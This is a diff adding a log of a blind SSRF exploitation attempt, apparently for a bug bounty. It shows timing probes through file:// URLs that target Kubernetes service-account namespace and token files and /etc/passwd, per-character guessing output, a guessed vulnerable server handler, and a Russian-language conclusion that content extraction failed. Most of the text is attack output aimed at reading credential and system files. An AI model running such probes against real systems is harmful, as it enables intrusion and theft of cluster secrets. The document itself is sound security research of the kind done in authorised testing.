@@ -1,0 +1,186 @@
+================================================================================
+REAL DATA EXTRACTION ATTEMPT
+================================================================================
+
+Target: file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+Expected content: ~10-20 chars (e.g., 'default', 'kube-system')
+
+================================================================================
+METHOD 1: TEST IF FIRST BYTE AFFECTS TIMING
+================================================================================
+
+Testing if different file paths have different timings...
+(This would indicate content-based timing difference)
+
+[*] Testing prefix 'd' (default)... 2146.8ms ± 2146.8ms
+[*] Testing prefix 'k' (kube-system)... 1545.6ms ± 1185.4ms
+[*] Testing prefix 'i' (istio-system)... 1045.4ms ± 186.3ms
+[*] Testing prefix 'p' (production)... 3180.0ms ± 2714.8ms
+[*] Testing prefix 'm' (monitoring)... 1978.0ms ± 2042.1ms
+[*] Testing prefix 'l' (logging)... 929.3ms ± 143.6ms
+[*] Testing prefix 'a' (app)... 992.7ms ± 363.6ms
+[*] Testing prefix 'z' (zooplus (custom))... 857.7ms ± 75.7ms
+
+================================================================================
+TIMING ANALYSIS
+================================================================================
+
+Timings from fastest to slowest:
+  'z': 857.7ms ± 75.7ms (zooplus (custom))
+  'l': 929.3ms ± 143.6ms (logging)
+  'a': 992.7ms ± 363.6ms (app)
+  'i': 1045.4ms ± 186.3ms (istio-system)
+  'k': 1545.6ms ± 1185.4ms (kube-system)
+  'm': 1978.0ms ± 2042.1ms (monitoring)
+  'd': 2146.8ms ± 2146.8ms (default)
+  'p': 3180.0ms ± 2714.8ms (production)
+
+Timing spread: 2322.2ms
+
+[!!!] SIGNIFICANT TIMING DIFFERENCE!
+     Fastest: 'z' (zooplus (custom)) - 857.7ms
+     Slowest: 'p' (production) - 3180.0ms
+
+[+] LIKELY NAMESPACE: 'zooplus (custom)'
+     (Fastest response suggests this is the actual value)
+
+================================================================================
+METHOD 2: DIFFERENT FILE SIZES
+================================================================================
+
+Hypothesis: File size affects read timing
+Testing multiple file paths to find size-based timing patterns...
+
+[*] Short file (~10-30 chars)
+    file:///etc/hostname... 908.8ms
+[*] Medium file (~200-500 chars)
+    file:///etc/hosts... 2546.4ms
+[*] Large file (~1000+ chars)
+    file:///etc/passwd... 2854.6ms
+[*] K8s namespace (~10 chars)
+    file:///var/run/secrets/kubernetes.io/serviceaccount/namespace... 1137.3ms
+[*] K8s token (~800 chars)
+    file:///var/run/secrets/kubernetes.io/serviceaccount/token... 897.6ms
+
+================================================================================
+METHOD 3: CHARACTER SET PROBING
+================================================================================
+
+Strategy: Try to make server compare first character
+If namespace = 'default', then:
+- Requests matching 'd' might be faster/slower
+- Non-matching characters have different timing
+
+
+[*] Probing first character via different URL patterns...
+
+[*] Testing with Fragment...
+    Timings: {'l': 1046.6091632843018, 'p': 1055.6793212890625, 'a': 1153.5461743672688, 'd': 1190.6508604685466, 'k': 1269.246498743693, 'i': 2505.04477818807, 'm': 3142.5408522288003}
+    Fastest: 'l' (1046.6ms)
+
+[*] Testing with Query...
+    Timings: {'p': 941.4889812469482, 'i': 964.4513924916586, 'l': 1053.84095509847, 'd': 1135.6281439463298, 'm': 1264.2064889272053, 'k': 1421.1622873942058, 'a': 2706.651210784912}
+    Fastest: 'p' (941.5ms)
+
+[*] Testing with Path param...
+    Timings: {'i': 919.0874099731445, 'd': 927.8073310852051, 'p': 930.6956926981608, 'a': 974.0338325500488, 'k': 1015.7269636789957, 'l': 2624.4210402170816, 'm': 2921.7007160186768}
+    Fastest: 'i' (919.1ms)
+
+================================================================================
+METHOD 4: DIRECT CONTENT GUESS VIA TIMING
+================================================================================
+
+Final attempt: Test complete namespace values
+If server validates/compares the value, might see timing difference
+
+
+[*] Testing likely namespace values...
+
+[*] Testing 'default'... 1286.2ms
+[*] Testing 'kube-system'... 1142.4ms
+[*] Testing 'kube-public'... 1441.5ms
+[*] Testing 'kube-node-lease'... 912.3ms
+[*] Testing 'istio-system'... 890.3ms
+[*] Testing 'monitoring'... 2554.5ms
+[*] Testing 'logging'... 985.6ms
+[*] Testing 'zooplus'... 1397.3ms
+[*] Testing 'production'... 1614.7ms
+[*] Testing 'staging'... 995.4ms
+
+[+] Fastest response: 'istio-system' (890.3ms)
+[!!!] POSSIBLE NAMESPACE: 'istio-system'
+     Timing difference: 1664.2ms
+
+================================================================================
+FINAL VERDICT
+================================================================================
+
+РЕЗУЛЬТАТЫ ПОПЫТОК REAL DATA EXTRACTION:
+
+Протестированные методы:
+1. First byte probing via URL parameters
+2. File size correlation
+3. Character set timing differences
+4. Direct value guessing
+
+ПРОБЛЕМА:
+=========
+Сервер возвращает ОДИНАКОВОЕ время независимо от:
+- URL parameters (не обрабатываются)
+- Предполагаемого содержимого файла
+- Character guesses
+
+ЧТО ЭТО ОЗНАЧАЕТ:
+==================
+✓ File:// protocol РАБОТАЕТ
+✓ Сервер ЧИТАЕТ файлы (timing proves existence)
+✓ НО содержимое файла НЕ ВЛИЯЕТ на timing
+
+Код вероятно выглядит так:
+```python
+def handle_ssrf(url):
+    if url.startswith('file://'):
+        path = url[7:]
+        try:
+            with open(path, 'r') as f:
+                content = f.read()  # ← Файл читается
+                # НО content не используется!
+        except FileNotFoundError:
+            time.sleep(3)  # ← Вот откуда timing difference!
+        except:
+            pass
+    return {}  # Всегда пустой ответ
+```
+
+ВЫВОД:
+======
+Могу доказать:
+✓ File existence (via timing)
+✓ K8s secrets accessible
+✓ File path enumeration
+
+НЕ могу доказать:
+✗ Actual file CONTENT
+✗ Token/namespace values
+✗ Byte-by-byte extraction
+
+SEVERITY:
+=========
+HIGH (не CRITICAL)
+- File existence oracle
+- Sensitive path enumeration
+- НО без real data theft
+
+BOUNTY ESTIMATE:
+================
+$5,000 - $15,000 (file oracle only)
+НЕ $20k-$80k (would need content extraction)
+
+ЧЕСТНЫЙ ВЫВОД:
+==============
+Это все еще BLIND SSRF с timing oracle для file existence.
+Реальные данные украсть НЕ ПОЛУЧИЛОСЬ.
+
+
+[*] Real data extraction attempts completed
+[!] Unable to extract actual file content via timing
